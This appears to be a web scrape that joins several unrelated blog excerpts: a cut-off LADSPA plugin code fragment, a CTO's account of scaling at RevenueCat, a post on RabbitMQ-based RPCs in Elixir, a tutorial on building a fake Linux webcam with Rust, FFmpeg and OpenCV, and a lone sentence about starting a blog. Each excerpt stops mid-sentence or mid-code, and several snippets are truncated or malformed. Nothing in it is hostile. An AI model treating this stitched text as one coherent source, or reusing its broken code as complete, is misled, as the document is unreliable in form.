LADSPA_HINT_DEFAULT_1;</span><br><span>    portRangeHints[ML_MUTE_INTERVAL].LowerBound = <span>1</span>;</span><br><span>    portRangeHints[ML_MUTE_LENGTH].HintDescriptor = LADSPA_HINT_BOUNDED_BELOW | LADSPA_HINT_DEFAULT_1;</span><br><span>    portRangeHints[ML_MUTE_LENGTH].LowerBound = <span>1</span>;</span><br><span>    portRangeHints[ML_INPUT].HintDescriptor = <span>0</span>;</span><br><span>    portRangeHints[ML_OUTPUT].HintDescriptor = <span>0</span>;</span><br><span></span><br><span>    descriptor-&gt;PortRangeHints = portRangeHints;</span><br><span></span><br><span>    descriptor-&gt;instantiate = instantiateMuteLine;</span><br><span>    descriptor-&gt;connect_port = connectPort;</span><br><span>    descriptor-&gt;activate = …</span></pre></td></tr></tbody></table></figure></div></div>

  <p>There is a lot written about the importance of scaling as a founder in a fast-growing startup. Most of it focused on the CEO role. The generic advice on leadership also applies to other non-CEO roles, but I could not find a lot of content targeted to technical founders. In fact, after reading a <a href="https://twitter.com/elwatto/status/1230977002192031744?s=20" target="_blank">bunch of S-1 forms</a>, <strong>it was hard to find first-time CTOs going all the way from MVP to IPO</strong> (as opposed to founding CEOs). I found this fact really intriguing, and I wanted to dig deeper to try to understand the reasons. It was also stressing me out to some degree: <em>what if I don’t manage to scale fast enough? What does scaling even mean? I’d rather prepare before it becomes a real problem! I want to be the CTO who makes <a href="https://revenuecat.com/" target="_blank">RevenueCat</a> a public company!</em><sup>1</sup></p>

<p>Is it really much harder for non-CEO founders to scale quickly? Or perhaps it is that CEOs have a stronger support network. These could be the reasons. Or maybe I was asking the wrong question. After talking to a lot of founder CTOs, there was something clear: <strong>there is no standard definition for the CTO role</strong>, responsibilities will totally change <strong>depending on the company and the stage</strong>. At inception, the CTO is probably a glorified individual contributor, but this can escalate very quickly. Everyone’s experiences are different. Unfortunately, I don’t have the answers for other non-CEO founder roles, and maybe I don’t even have it for first-time CTOs either. However, I thought it would be a good self-awareness exercise to reflect on the things I’ve learned and how my responsibilities have changed during the first 3 years at <a href="https://revenuecat.com/" target="_blank">RevenueCat</a>.</p>

<h3 id="the-cto-vs-vp-of-engineering-dilemma">The CTO vs VP of Engineering dilemma</h3>
<p>Simplifying, we could say that the CTO role is closer to architecture and code; whereas the VPE would be in charge of processes and management. A simple analogy could be the Senior/Staff Engineer path versus the Engineering Management career path.</p>

<p>During the early days, you need a CTO to architect and coordinate a small group of ICs hacking the minimum viable product. At this stage, being a founder is extremely helpful to set the vision of the product and the engineering culture. Ideally, the CTO is a domain expert in the problem that the startup is trying to solve.</p>

<p>But what if the product becomes successful? What if you reach product-market fit? You will need to hire a lot more engineers to satisfy customer demands. That’s a great problem to have. You might get lucky and get funding, or you might even be profitable already. But a higher headcount means more polished processes. At some point, somebody will inevitably need to start wearing the VP of Engineering hat. It will happen, and it will become quite obvious as the previous (or lack of) processes start to break. You have a couple of options at this stage. The CTO can start acting as VPE, or you can hire externally. It is probably a matter of personal preference or previous management experience. But <strong>it is a totally different set of skills</strong>, which might be difficult to acquire in a hyper-growth environment. Therefore, most commonly, the VP of Engineering is <a href="https://www.saastr.com/makes-bad-cto/" target="_blank">hired externally</a>.</p>

<p>If you are a founder you have some flexibility. You might have control to decide which way you want to go. Perhaps you hate people management and want to keep using your technical skills and problem knowledge to influence the technology directly. Or maybe you want to improve your management skills. Early employees tend to be more forgiving about founder managerial flaws. They joined because they trusted the founders, believed in the vision, and know they have good intentions. In the beginning, they might even prefer you as a direct manager than an external person. But eventually, there will be several layers of management, so you better learn fast if you want to follow this path and don’t have the experience.</p>

<p>Bryan Helmig, Zapier’s co-founder and CTO, says you need to <a href="https://zapier.com/engineering/startup-cto/" target="_blank"><em>figure out where you get your dopamine hits</em></a>. Personally, I have always been more of a <em>computer person</em> than a <em>people person</em>. 
I was not sure which path I should take, but I would have bet on the one involving computers. I’ve always loved them, and I would say I am a better, more experienced engineer than I am a manager. I feel  more energized after shipping a new feature than during a one-on-one meeting.</p>

<p>However, as a founder, <strong>I get the dopamine hits when the company is doing well</strong>. When a customer recommends our product. When we hit the revenue goal. When we hire engineers that are better than me. When these engineers are happy and successfully shipping ambitious features. When code review is exhaustive but collaborative, not adversarial.</p>

<p>So, ultimately, I’ve taken the approach to not simply follow my personal preference, but to <strong>do whatever is more impactful for the company at each stage</strong>. I am a problem solver after all. That is how I have been thinking about my role. My <strong>founder identity should be more important than my CTO title</strong>. In the long run, as a major shareholder, I need to do whatever is best for the company.</p>

<p>Typically breaking points start happening <strong>somewhere between 8 and 12 engineers</strong>. But it can be different depending on the product and the environment. In our case, as a fully distributed company, we encountered several breaking points as we were adding new time zones. During this <em>no man’s land stage</em> most technical founders are temporarily forced to wear both CTO and VPE hats simultaneously. Being flexible turned out to be very advantageous. I tried to step up and (poorly and temporarily) do work that nobody had the bandwidth to do. This helped me to identify the pain points and tweak the process or hire somebody to take over these tasks.</p>

<p>One thing that helped me a lot to navigate my role was to learn how other founders were spending their time at each stage. I have been journaling since we started the company. Based on these notes, I will briefly describe the tasks I’ve been focused on and how my role has evolved.</p>

<h2 id="2018-yc-mvp-and-first-hires">2018: YC, MVP, and first hires</h2>
<p>When we did Y-Combinator it was only <a href="https://twitter.com/jeiting" target="_blank">Jacob</a> and me. Jacob would write SDK and frontend code and I would focus on the backend and infrastructure. After YC we hired our first two engineers to take over Jacob’s coding responsibilities full time. We were all based in San Francisco and these hires were people we already knew. Easy (almost inexistent) management. <strong>There was no process overhead</strong>, we had one-week sprints and <strong>we were moving really fast</strong>.</p>

<p>These days were stressful but fun. We were setting the foundations of the engineering culture and seeing customers signing up one by one. Most of my time was spent architecting the initial version of features, listening to customers, and building their requests as fast as we humanly could. <strong>We would ship most requests on the same day</strong>.</p>

<p>My biggest concern here was making sure we were building something people wanted and the ability to keep growing to justify our <a href="https://techcrunch.com/2018/10/24/revenuecat-seed-funding/" target="_blank">$1.5M seed round</a>.</p>

<p><strong>Main learnings</strong>: Too many, impossible to summarize. We learned a lot while doing Y-Combinator. The main thing would be that talking to customers, building what they want, and making them happy was paramount. We even made this and shipping fast two of our <a href="https://www.revenuecat.com/blog/values" target="_blank">core values</a>.</p>

<h2 id="2019-keeping-up-with-customers-and-scaling-the-tech">2019: Keeping up with customers and scaling the tech</h2>
<p>It looks like we had achieved some kind of product-market fit. <strong>Customers were coming to us, support tickets started piling up and our API throughput would increase every day</strong>. We added our first remote engineer, located in Taiwan. The time zone difference was hard initially and we needed to adapt processes. But it all worked out fine. We got better coverage for customer requests and monitoring.</p>

<p><strong>Onboarding was a complete, one-off manual process</strong>. I started doing one-on-ones (not very regularly, maybe once a month), but <strong>management was still pretty light</strong>. Most conversations were still very technical. I was still an individual contributor. I was also on booth duty at a couple of conferences.</p>

<figure>
  <img src="https://miguelcarranza.es/assets/posts/boothduty.JPG" alt="Booth Duty, AltConf 2019">
</figure>

<p>My main concern at this stage was purely technical: <strong>the scalability of our systems</strong>. All of our engineers had a more product-oriented background, and we had some clear single points of failure. Not going down was constantly in my mind. The scale was outgrowing my comfort zone every single day. We did a decent job optimizing the most common scenarios, <a href="https://www.revenuecat.com/blog/aurora-migration-zero-downtime" target="_blank">migrating infrastructure before reaching breaking points</a>, and <strong>paying down the technical debt we took the year before</strong>.</p>

<p>Up until Q4, I was the de-facto on-call engineer. I did not want to disturb other team members outside working hours, and I felt reliability was my ultimate responsibility as a technical founder. I would carry my laptop literally everywhere. Eventually, <strong>we implemented an on-call rotation, and in retrospect, we should have done it earlier</strong>.</p>

<p><strong>Main learnings</strong>: Do not stress over scalability, but monitor as much as possible and always look out for the next bottleneck and single point of failure. Again, these are stressful but great problems to have. Establish an on-call policy as soon as possible, train engineers, and document resolution for known incidents. Rely on your team. <a href="https://miguelcarranza.es/technical-debt" target="_blank">Technical debt is actually good</a> if taken responsibly while trying to find product-market fit.</p>

<h2 id="2020-delegation-and-planning-the-future-organization">2020: Delegation and planning the future organization</h2>
<p>In 2020 we doubled the team again. We added engineers in Europe and Latin America. By the end of the year, we had multiple members in every team (SDK, frontend, backend…). We were able to work on several projects at the same time, and finally tackle more ambitious features. But we needed more coordination. <strong>A little bit of management structure was unavoidable at this stage.</strong></p>

<p>During Q1 and Q2 I spent most of my time reviewing code, providing architectural guidance, and coding a little bit on the side. I was still the person who had more context about our systems. By mid-year, it became very obvious that I was the bottleneck for …</p></article></div>

It’s the infrastructure backbone that allows our services (over fourty at this point) to communicate with each other. That mostly happens through <strong>events</strong> (since we have an event-sourced system), but in some cases what we need is a <em>request-response</em> interaction between two services. This is the best tool in a few use cases, like retrieving data on the fly or asking a service to do something and return a response. An industry standard for such interactions is HTTP, but we are not big fans of that. Instead, since RabbitMQ is so ubiquitous in our system, we settled on using it for request-response interactions as well in the form of <strong>Remote Procedure Calls</strong> (RPCs). In this post, I’ll go over the architecture of such interactions, the RabbitMQ topologies we use to make them work, the benefits around reliability and the compromises around performance, and finally how this all implemented to be as fault-tolerant as possible with Elixir.</p>

<h2 id="what-is-an-rpc">What is an RPC</h2>

<p>An RPC can be seen as a function call across sytem boundaries, instead of at the code execution level. An RPC allows you to call a <em>procedure</em> on another service and treat it mostly like a local function call (with the additional error handling to account for the network interaction).</p>

<p><img alt="Sketch of caller and receiver of an RPC" src="https://andrealeopardi.com/assets/media//2020-11-23-rpc-over-rabbitmq-with-elixir/sketch-rpc-definition.png"></p>

<p>I won’t go into too much detail about RPCs themselves, but you’re probably familiar with a common form of RPC: HTTP. HTTP request-response interactions between services in a service-oriented architecture are essentially RPCs, they’re just less explicit on the fact that they’re <em>calling a procedure</em>. One of the benefits of RPCs is, like HTTP, that they are agnostic of technologies. A services written in Elixir can make an RPC (or HTTP request) to a service written in Go, for example. If you want to read more about RPCs, their definition, their benefits, and more, guess where I’ll link you to? Exactly, <a href="https://en.wikipedia.org/wiki/Remote_procedure_call">Wikipedia</a>.</p>

<p>Throughout this post, I will refer to the services involved in an RPC as the <strong>caller service</strong> and the <strong>receiver service</strong>.</p>

<h2 id="why-rpcs-over-rabbitmq">Why RPCs over RabbitMQ</h2>

<p>At Community, we chose to do RPCs over RabbitMQ, instead of the common service-to-service communication via HTTP, for a few reasons.</p>

<p>The main reason is that we want to use message queues as often as possible. When you have a queue-based message broker between services that talk to each other, the availability requirements of the services can be less demanding. If you have two services that communicate over HTTP, then if the receiver service is down it means that the requester service will not get a response and will have to implement request retries in order to increase the chances of a successful request. With RabbitMQ in the middle, if the receiver is down then the RPC is queued and can be picked up once the receiver comes back up.</p>

<p>Another important reason that influenced our decision is that we make heavy use of RabbitMQ for all sorts of things. This means our engineer know it well, our infrastructure is solid, and we have good systems to trace and observe messages flowing through it.</p>

<p>One compromise we had to make is that, generally speaking, RPCs over RabbitMQ tend to be <em>slower</em> than direct service-to-service communication (such as HTTP). This is hard to avoid given that in our case we have a message broker sitting between the caller service and the receiver service. That means that you’ll <em>at least</em> have twice the RTT (round-trip time) on the network, since the messages you’re sending and receiving need to jump through one more hop than if you do direct service-to-service communication. However, when we do RPCs the bottleneck is rarely the network or the message broker, and instead tends to be the processing of the RPC itself. So, we’re fine with the compromise here.</p>

<h2 id="rabbitmq-topology">RabbitMQ topology</h2>

<p>Let’s talk about the <strong>RabbitMQ topology</strong> that powers our RPC system. We have the following components in place:</p>

<ul>
  <li>
    <p>A <em>headers</em> exchange called <code>rpc</code>. Caller services publish RPCs to this exchange with two headers, <code>destination</code> (the receiver service name) and <code>procedure</code> (the procedure name).</p>
  </li>
  <li>
    <p>Per-service queues where RPCs end up. Their name usually looks like <code>receiver_service.rpcs</code>. A single queue is shared across multiple <em>instances</em> (nodes) of the same service. All the running instances of the receiver service consume from this queue.</p>
  </li>
  <li>
    <p>A binding between each per-service queue and the <code>rpc</code> exchange. Since <code>rpc</code> is a headers exchange, the binding happens on the headers. Most commonly, receiver services bind their queue to the <code>rpc</code> exchange on the <code>destination: receiver_service_name</code> header, but sometimes we can be more flexible and specific by also using the <code>procedure</code> header.</p>
  </li>
  <li>
    <p>A per-instance <em>response queue</em> where responses to RPCs are published by the receiver service. Each <em>instance</em> of the caller service consumes from its dedicated response queue.</p>
  </li>
</ul>

<p>Below is an artistic representation of the RabbitMQ topology. This one is for you, my visual friends.</p>

<p><img alt="Sketch of RabbitMQ topology" src="https://andrealeopardi.com/assets/media//2020-11-23-rpc-over-rabbitmq-with-elixir/sketch-rabbitmq-topology.png"></p>

<h2 id="caller-architecture">Caller architecture</h2>

<p>Our focus when designing this architecture <em>was not</em> performance. Since our system is event-sourced, when services need to access data <em>fast</em>, we usually have alternatives to RPCs. In those cases, instead of fetching data from another service via RPC, a service can usually build a “local” data store (usually Redis, but whatever fits best) by consuming events and have fast access to that data store. However, this doesn’t cover use cases where a service wants to ask another service to do something and return a result. This can be usually also be done via asynchronous events, but sometimes it really can’t and in any case we like the agility of RPCs for when we’re moving fast and don’t want to commit to particular data exchanges in the long term.</p>

<p>Instead, we heavily focused on reliability and resource utilization. We want our RPCs to succeed whenever they can. We also want to limit RabbitMQ resource utilization as much as possible, since the message broker architecture shares the broker between all the services that use it.</p>

<p>With these goals in mind, we came up with the topology described above. In the sketch below, I’m focusing on the caller service perspective.</p>

<p><img alt="Sketch of the architecture of the sender service" src="https://andrealeopardi.com/assets/media//2020-11-23-rpc-over-rabbitmq-with-elixir/sketch-caller-architecture.png"></p>

<p>This is what happens, step by step, when a service makes an RPC:</p>

<ul>
  <li>
    <p>The caller assigns a new UUID to the request and encodes the request (we happen to use Protobuf, but anything would work).</p>
  </li>
  <li>
    <p>The caller includes the name of the <em>response queue</em> in the <code>reply_to</code> metadata field of the RabbitMQ message.</p>
  </li>
  <li>
    <p>The caller publishes the request on the main RPC exchange (<code>rpc</code>) using headers to specify the <code>destination</code> and <code>procedure</code> to call.</p>
  </li>
  <li>
    <p>If publishing the request is successful, the caller stores the request in an in-memory key-value store (ETS for Elixir and Erlang folks), storing the mapping from request ID to caller process. This is used to map responses back to requests when they come back.</p>
  </li>
  <li>
    <p>The caller has a pool of AMQP channels also consuming from the response queue. When the response comes back on such queue, a consumer channel picks it up, finds the corresponding caller process from the in-memory key-value store, and hands the caller process the response.</p>
  </li>
</ul>

<p>From a code standpoint, an RPC really does look like a function call. The main difference is that an RPC can <em>definitely</em> fail due to the network interaction, so we always make sure to return a successful value or an error value. In Elixir, that translates to <code>{:ok, response}</code> or <code>{:error, reason}</code> tuples. In a typed language (say Haskell) it would be the “either” type. In Elixir-flavoured pseudocode, this is what an RPC looks like from the caller side:</p>

<div><div><pre><code><span>case</span> <span>RPCPool</span><span>.</span><span>call</span><span>(</span><span>"my_receiver_svc"</span><span>,</span> <span>"add"</span><span>,</span> <span>%{</span><span>"args"</span> <span>=&gt;</span> <span>[</span><span>4</span><span>,</span> <span>9</span><span>]})</span> <span>do</span>
  <span>{</span><span>:ok</span><span>,</span> <span>%{</span><span>"result"</span> <span>=&gt;</span> <span>result</span><span>}}</span> <span>-&gt;</span>
    <span>result</span> <span>#=&gt; 13</span>

  <span>{</span><span>:error</span><span>,</span> <span>reason</span><span>}</span> <span>-&gt;</span>
    <span>raise</span> <span>"failed because: </span><span>#{</span><span>inspect</span><span>(</span><span>reason</span><span>)</span><span>}</span><span>"</span> <span>#=&gt; such as :timeout</span>
<span>end</span>
</code></pre></div></div>

<h3 id="the-response-queue">The response queue</h3>

<p>It’s worth focusing on the <strong>response queue</strong>. This queue is declared by all AMQP channels in the caller pool when they start up. This is a common pattern in RabbitMQ since declaring resources (queues, exchanges, and bindings) is <em>idempotent</em>, that is, you can do it as many times as you want and the resource is declared only once.</p>

<p>The response queue is declared with a key property: <code>auto_delete</code>. When this property is present, a queue is deleted as soon as there are no channels consuming from it anymore. This is exactly the behavior we want: as long as a caller pool is “up and running”, there’s gonna be at least one channel consuming from the queue and handing responses over to caller processes. However, if the whole pool or the whole node for the caller goes down then the queue will be deleted. This works perfectly, because if the caller node goes down, then we likely lost the “context” of the requests, and even if the node will come back up then it won’t know what to do with the responses anymore. As <a href="https://www.rabbitmq.com/direct-reply-to.html">one RabbitMQ documentation page</a> puts it:</p>

<blockquote>
  <p>Reply messages sent using [RPC] are in general not fault-tolerant; they will be discarded if the client that published the original request subsequently disconnects. The assumption is that an RPC client will reconnect and submit another request in this case.</p>
</blockquote>

<p>In this way, we allow RabbitMQ to clean itself up and avoid leaving garbage in it, without writing any code to do so.</p>

<p>The code for each AMQP channel that consumes responses goes something like this:</p>

<div><div><pre><code><span>channel</span> <span>=</span> <span>AMQP</span><span>.</span><span>Channel</span><span>.</span><span>open</span><span>(</span><span>amqp_connection</span><span>)</span>

<span># "response_queue" is determined per-pool.</span>
<span># Usually it looks like: "caller_service.#{UUID.generate()}"</span>
<span>AMQP</span><span>.</span><span>Queue</span><span>.</span><span>declare</span><span>(</span><span>channel</span><span>,</span> <span>response_queue</span><span>,</span> <span>auto_delete:</span> <span>true</span><span>)</span>

<span>AMQP</span><span>.</span><span>Basic</span><span>.</span><span>consume</span><span>(</span><span>channel</span><span>,</span> <span>response_queue</span><span>)</span>
</code></pre></div></div>

<p>When a response comes back, the caller does a key lookup on the response’s request ID in the in-memory key-value data store to retrieve the original request and moreover the process that’s waiting on the response. It looks like this:</p>

<div><div><pre><code><span>def</span> <span>handle_rabbitmq_message</span><span>(</span><span>message</span><span>)</span> <span>do</span>
  <span>response</span> <span>=</span> <span>decode!</span><span>(</span><span>message</span><span>)</span>
  <span>caller_process</span> <span>=</span> <span>KVStore</span><span>.</span><span>fetch</span><span>(</span><span>re…</span></code></pre></div></div></div></div>

<p>That's me on Zoom, attempting to do what everyone else was doing these days:
messing around with their webcam. Trying to have some fun during those remote
calls that filled your entire calendar now that you've gone full remote.</p>
<p>I could think of three reasons for Zoom's virtual background feature not working
for me:</p>
<ol>
<li>My webcam isn't that good. Too much noise in the input;</li>
<li>My background is awful, filled with visual noise, and with a color that's
probably too close to my own skin;</li>
<li>Linux. We're often the underdogs when it comes to support from proprietary
software.</li>
</ol>
<p>A sensible person would move on with his life. Or maybe buy a better webcam.</p>
<p>A sensible person would not go:</p>
<blockquote>
<p>Oh, I used to study computer graphics! This looks like a fun side-project</p>
<p>Me, first days of quarantine</p>
</blockquote>
<p>This felt like a good excuse to play around with
<a href="https://www.rust-lang.org/" target="_blank" rel="nofollow noopener noreferrer">Rust</a>, but most of all, to finally learn how to use
<a href="https://ffmpeg.org/" target="_blank" rel="nofollow noopener noreferrer">FFmpeg</a>.</p>
<h2>FFmpeg</h2>
<p>This is an open source library for multimedia processing. It's likely you
stumbled upon it at some point, particularly if you googled something like "how
to convert video format".</p>
<p><code>ffmpeg</code> itself is a command line tool that provides an entire toolkit to
process video/audio streams. A few examples:</p>
<div data-language="bash"><pre><code>
$ ffmpeg -i input.mkv -vf <span>scale</span><span>=</span>1280x720 output.mkv



$ ffmpeg -i input.mp4 output.mkv


$ ffmpeg -f v4l2 -framerate <span>25</span> -video_size 640x480 <span>\</span>
  -i /dev/video0 -t 00:00:10 output.mkv</code></pre></div>
<p>Under the hood, FFmpeg include libAV, which is the API that allows you to do all
of this stuff, and much more, programatically.</p>
<p>So my overall idea was:</p>
<ul>
<li>Create a fake webcam on my system (something like <code>/dev/video1</code> instead
of <code>/dev/video0</code>, which points to my real one);</li>
<li>Use FFmpeg to read the input from my webcam;</li>
<li>That output would go through an magic video processing box that I'll somehow build;</li>
<li>Use the resulting video as the feed from my fake webcam;</li>
<li>Learn something along the way.</li>
</ul>
<p><strong>Spoiler alert</strong>: The video processing yielded some results, just not as good
as I had hoped for.</p>
<h2>Faking a webcam</h2>
<p>As it turns out, this is a fairly easy thing to do, in Linux at least. The way
devices are registered in the system is friendly towards these kinds of
hacks.</p>
<p>Video devices in Linux are commonly handled by a set of drivers called V4L2
(remember the <code>-f v4l2</code> flag in the example above?).</p>
<p>And someone had already published a kernel module that can be used to create
virtual devices compatible with V4L2: <a href="https://github.com/umlaeute/v4l2loopback" target="_blank" rel="nofollow noopener noreferrer">v4l2loopback</a></p>
<p>With this module, creating a fake webcam is as easy as:</p>
<div data-language="bash"><pre><code>$ <span>sudo</span> modprobe v4l2loopback <span>devices</span><span>=</span><span>1</span> <span>\</span>
  <span>video_nr</span><span>=</span><span>2</span> <span>card_label</span><span>=</span><span>"Fake"</span> <span>exclusive_caps</span><span>=</span><span>1</span></code></pre></div>
<p>My system actually has two default video devices. So <code>video_nr=2</code> is because
I actually need to create <code>/dev/video2</code> instead. Which is what happened:</p>
<div data-language="bash"><pre><code>$ v4l2-ctl --list-devices
Fake <span>(</span>platform:v4l2loopback-000<span>)</span>:
        /dev/video2

UVC Camera <span>(</span>046d:0825<span>)</span> <span>(</span>usb-0000:2a:00.3-1.4<span>)</span>:
        /dev/video0
        /dev/video1</code></pre></div>
<h2>Feeding the fake device</h2>
<p>Once you have that device running, you may notice it doesn't show up in your
browser.
That's because there's no actual video feed coming from it. What would your
browser show?</p>
<p>So let's debug that quickly with <code>ffmpeg</code>, just to make sure we can get this
layer to work. We can prototype things with the CLI tool before commiting to
implementing a whole program using libav.</p>
<div data-language="bash"><pre><code>ffmpeg <span>\</span>
  -re <span>\</span> 
  -i pickle-rick.mkv <span>\</span> 
  -vcodec rawvideo <span>\</span> 
  -pix_fmt yuv420p <span>\</span> 
  -framerate <span>25</span> <span>\</span>
  -f v4l2 /dev/video2</code></pre></div>
<p>And my browser is now able to consume <code>/dev/video2</code> correctly.</p>

<p>I can even do a test with my actual webcam, and include a simple filter, such as
inverting colors, which makes me look like some sort of white walker.</p>
<div data-language="bash"><pre><code>ffmpeg <span>\</span>
  -f v4l2 -framerate <span>25</span> -video_size 640x480 <span>\</span>
  -input_format mjpeg <span>\</span>
  -i /dev/video0 <span>\</span>
  -vcodec rawvideo -pix_fmt yuv420p <span>\</span>
  -vf negate <span>\</span> 
  -f v4l2 /dev/video2</code></pre></div>

<p>Ok, this was fun. Let's now port this over to actual code...</p>
<h2>The Code</h2>
<p>Part of the challenge on the Rust side of things is the fact that libAV is
a C API, and an outdated one at that. Much of the goodness we're used to
with modern languages isn't available. Things such as error handling and
debugging become are closer to a black art than I'd prefer.</p>
<p>The existing FFI wrappers for ffmpeg (such as the <a href="https://crates.io/crates/ffmpeg4-ffi" target="_blank" rel="nofollow noopener noreferrer">one I'm using</a>)
do a decent job at providing a more Rust-like interface, but due to weak typing
of some of the functions, it can only go so far:</p>
<div data-language="rust"><pre><code><span>use</span> std<span>::</span>ffi<span>::</span><span>{</span>CString<span>}</span><span>;</span>
<span>use</span> ffmpeg4_ffi<span>::</span>sys<span>::</span><span>{</span>AVFormatContext<span>,</span> av_guess_format<span>}</span><span>;</span>
<span>use</span> std<span>::</span>ptr<span>::</span><span>{</span>null<span>,</span> null_mut<span>}</span><span>;</span>

<span>let</span> <span>mut</span> context<span>:</span> <span>*</span><span>mut</span> AVFormatContext <span>=</span> <span>null_mut</span><span>(</span><span>)</span><span>;</span>

<span>let</span> format <span>=</span> <span>unsafe</span> <span>{</span>
  <span>av_guess_format</span><span>(</span>
    CString<span>::</span><span>new</span><span>(</span><span>"v4l2"</span><span>)</span><span>.</span><span>unwrap</span><span>(</span><span>)</span><span>,</span>
    <span>null</span><span>(</span><span>)</span><span>,</span>
    <span>null</span><span>(</span><span>)</span>
  <span>)</span>
<span>}</span></code></pre></div>
<p>This is what most calls to libAV look like. Strings need to be converted to
their C representation (null-terminated arrays of characters). Pointers need to
be allocated separately and passed around as mutable arguments. And yes, pretty
much everything is <code>unsafe</code>, since we're dealing with raw pointers.</p>
<p>With all that in mind, I won't bore you with all the details of the code for
this layer. But it's all isolated (and somewhat readable) in the two modules
where I abstracted this behaviour to:</p>
<ul>
<li><a href="https://github.com/naps62/instacam/blob/master/src/av/encoder_ctx.rs" target="_blank" rel="nofollow noopener noreferrer"><code>DecoderCtx</code></a>: Connects to a video source, and provides an interface to read video frames from it. The analog to the <code>-f v4l2 -framerate 25 -video_size 640x480 -i /dev/video0</code> part of the CLI commands;</li>
<li><a href="https://github.com/naps62/instacam/blob/master/src/av/encoder_ctx.rs" target="_blank" rel="nofollow noopener noreferrer"><code>EncoderCtx</code></a>: The opposite end of the pipeline, where processed frames are encoded again and written to an output video feed (<code>-vcoded rawvideo -pix_fmt yuv420p -f v4l2 /dev/video2</code>);</li>
</ul>
<p>With that in mind, we can write a more high-level program that pipes the input
feed to the output:</p>
<div data-language="rust"><pre><code><span>use</span> ffmpeg4_ffi<span>::</span>sys<span>;</span>

<span>let</span> <span>mut</span> decoder <span>=</span> DecoderCtx<span>::</span><span>new</span><span>(</span><span>&amp;</span>settings<span>)</span>
<span>let</span> <span>mut</span> encoder <span>=</span> EncoderCtx<span>::</span><span>new</span><span>(</span><span>&amp;</span>settings<span>,</span> <span>&amp;</span>decoder<span>)</span>

# allocate two frames
<span>let</span> input<span>:</span> <span>*</span><span>mut</span> sys<span>::</span>AVFrame <span>=</span> <span>unsafe</span> <span>{</span> sys<span>::</span><span>av_frame_alloc</span><span>(</span><span>)</span> <span>}</span><span>;</span>
<span>let</span> output<span>:</span> <span>*</span><span>mut</span> sys<span>::</span>AVFrame <span>=</span> <span>unsafe</span> <span>{</span> sys<span>::</span><span>av_frame_alloc</span><span>(</span><span>)</span> <span>}</span><span>;</span>

<span>loop</span> <span>{</span>
  decoder<span>.</span><span>decode_frame</span><span>(</span><span>&amp;</span>input<span>)</span><span>;</span>

  <span>do_stuff</span><span>(</span><span>&amp;</span>input<span>,</span> <span>&amp;</span>output<span>)</span><span>;</span>

  encoder<span>.</span><span>encode_frame</span><span>(</span><span>&amp;</span>output<span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>Now within <code>do_stuff</code> we can do whatever we want with the given image. We just
need to ensure the output image is encoded in the correct format (the one
expected by out encoder, <code>yuv420p</code> in my case) and resolution.</p>
<p>This also can, and probably should, be parallelized in some way.
Ideally, frames should be read at a constant rate, equal to the desired
framerate, and processed asynchronously. The processing done by <code>do_stuff</code> and
the encoding itself take considerable time. If the image is large enough, or if
<code>do_stuff</code> is actually doing a lot of stuff, its easy for the framerate of your
output to drop as a consequence. For this purpose
though, we're not getting into that (perhaps a later post).</p>
<p>Now on to editing the image.</p>
<h2>OpenCV</h2>
<p>This one gives me a few bad memories from back when I was a student, but its
still one of the obvious candidates image processing libraries.</p>
<p>Now that we have a frame isolated, there's still one step left before being able to process them with OpenCV.</p>
<h3>Pixel format conversion</h3>
<p>Raw frames come in <a href="https://en.wikipedia.org/wiki/YUV" target="_blank" rel="nofollow noopener noreferrer">YUV format</a> which store <em>luma</em> (how bright a pixel
is) in the Y channel and <em>chroma</em> (what color it is) in U and V channels.
OpenCV needs images to be in <code>BGR</code> format, with 3 color channels.</p>
<p>For that, we also need to use <code>libswscale</code> which is part of the FFmpeg package,
and handles conversions between pixel format conversions:</p>
<div data-language="rust"><pre><code># we need <span>4</span> frames now
<span>let</span> input_yuv <span>=</span> sys<span>::</span><span>av_frame_alloc</span><span>(</span><span>)</span><span>;</span>

<span>loop</span> <span>{</span>
  decoder<span>.</span><span>decode_frame</span><span>(</span><span>&amp;</span>input_yuv<span>)</span><span>;</span>

  <span>do_stuff</span><span>(</span><span>&amp;</span>input_bgr<span>,</span> <span>&amp;</span>output_rgb_frame<span>)</span><span>;</span>

  # convert processed RGB frame back into YUV

  encoder<span>.</span><span>encode_frame</span><span>(</span><span>&amp;</span>output_yuv<span>)</span><span>;</span>
<span>}</span></code></pre></div>
<h3>Blurring</h3>
<p>As a simple example, let's say we want our <code>do_stuff</code> function to blur the input
image. With all the encoding &amp; conversion work out of the way, that is now
a simple task:</p>
<div data-language="rust"><pre><code><span>use</span> opencv<span>::</span>imgproc<span>;</span>
<span>use</span> opencv<span>::</span>core<span>::</span><span>{</span>BorderTypes<span>,</span> Point<span>,</span> Size<span>}</span><span>;</span>

    <span>let</span> src <span>=</span> <span>cast_frame_to_mat</span><span>(</span>input<span>)</span><span>;</span>
    <span>let</span> <span>mut</span> dst <span>=</span> <span>cast_frame_to_mat</span><span>(</span>output<span>)</span><span>;</span>

    imgproc<span>::</span><span>blur</span><span>(</span>
        <span>&amp;</span>src<span>,</span>
        <span>&amp;</span><span>mut</span> dst<span>,</span>
        Size<span>::</span><span>new</span><span>(</span><span>64</span><span>,</span> <span>64</span><span>)</span><span>,</span>
        Point<span>::</span><span>new</span><span>(</span><span>-</span><span>1</span><span>,</span> <span>-</span><span>1</span><span>)</span><span>,</span>
        BorderTypes<span>::</span>BORDER_CONSTANT <span>as</span> i32<span>,</span>
    <span>)</span>
    <span>.</span><span>unwrap</span><span>(</span><span>)</span><span>;</span>

    <span>self</span><span>.</span>out
<span>}</span></code></pre></div>
<p>Notice we need use <code>frame_to_mat</code> to convert FFmpeg frames to OpenCV's structs.
The underlying data buffers aren't touched, so this isn't an expensive
operation. The implementation is available <a href="https://github.com/naps62/instacam/blob/master/src/filters/utils.rs" target="_blank" rel="nofollow noopener noreferrer">here</a> for those
interested in the details.</p>
<p>Since OpenCV already provides functions for standard operations, we just need to
call <a href="https://docs.rs/opencv/0.46.3/opencv/imgproc/fn.blur.html" target="_blank" rel="nofollow noopener noreferrer"><code>imgproc::blur</code></a> to tie it all together2:</p>

<h2>Multiple filters</h2>
<p>The final version is a bit more complex than the code shown above, because it
allows piping multiple filters in a pipeline, by simply configuring a JSON file:</p>
<div data-language="json"><pre><code>  <span>"input"</span><span>:</span> <span>"/dev/video0"</span><span>,</span>
  <span>"output"</span><span>:</span> <span>"/dev/video2"</span><span>,</span>

<p>This is the story of how I started my blog, reached the HackerNews front page and spoke at a conference and how one childhood experience was in the way of it all.</p>



